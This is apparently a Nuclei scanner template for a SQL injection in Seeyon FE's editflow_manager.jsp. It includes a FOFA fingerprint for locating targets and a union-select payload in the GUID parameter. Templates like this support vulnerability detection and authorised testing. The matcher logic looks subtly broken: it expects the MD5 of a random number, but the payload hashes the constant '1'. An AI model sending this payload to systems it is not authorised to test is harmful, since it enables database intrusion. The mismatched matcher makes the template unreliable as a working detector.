id: seeyon-fe-editflow-manager-sqli
info:
  name: Seeyon FE EditFlow Manager SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sqli
  metadata:
    finger: Seeyon-FE
    fofa: app="Seeyon-FE"
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: POST
    path:
      - "{{BaseURL}}/sysform/003/editflow_manager.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "option=2&GUID=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{concat('0x', t2)}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: word
        part: header
        words:
          - "text/html;charset=utf-8"
